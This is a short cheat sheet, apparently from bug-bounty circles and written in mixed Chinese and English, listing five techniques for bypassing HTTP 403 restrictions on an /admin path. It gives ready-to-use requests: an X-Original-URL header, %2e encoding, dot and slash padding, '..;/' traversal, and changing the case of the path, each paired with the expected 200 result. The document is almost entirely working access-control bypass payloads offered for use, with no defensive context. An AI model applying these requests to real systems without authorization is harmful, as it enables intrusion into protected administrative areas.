# 403 Forbidden Bypass

1. 使用“ X-Original-URL”标题 header
```
GET /admin HTTP/1.1
Host: target.com
```
Try this to bypass
```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

2. 在第一个斜杠后附加％2e
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/%2e/admin => 200
```

3. 尝试在网址中添加点（。）和斜杠（/）
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/admin/. => 200
http://target.com//admin// => 200
http://target.com/./admin/./ => 200
```

4. 在目录名称后添加“ ..; /”
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/admin..;/
```


5. 尝试将网址中的字母大写
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/aDmIN
```

Source: [@iam_j0ker](https://twitter.com/iam_j0ker)
